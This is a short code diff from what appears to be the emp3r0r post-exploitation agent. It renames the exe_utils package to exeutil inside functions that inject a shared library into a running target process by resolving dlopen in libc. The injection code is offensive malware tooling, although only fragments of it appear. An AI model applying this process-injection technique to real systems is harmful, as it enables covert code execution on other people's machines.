@@ -13,7 +13,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
-	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/external_file"
 	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -149,12 +149,12 @@ func InjectorHandler(pid int, method, checksum string) (err error) {
 
 // inject a shared library into target process
 func InjectSharedLib(so_path string, pid int) (err error) {
-	dlopen_addr, err := exe_utils.GetSymFromLibc(pid, "__libc_dlopen_mode")
+	dlopen_addr, err := exeutil.GetSymFromLibc(pid, "__libc_dlopen_mode")
 	if err != nil {
 		log.Printf("failed to get __libc_dlopen_mode address for %d: %v, trying `dlopen`", pid, err)
 	}
 	log.Printf("dlopen_addr: %v", dlopen_addr)
-	dlopen_addr, err = exe_utils.GetSymFromLibc(pid, "dlopen")
+	dlopen_addr, err = exeutil.GetSymFromLibc(pid, "dlopen")
 	if err != nil {
 		return fmt.Errorf("failed to get dlopen address for %d: %v", pid, err)
 	}
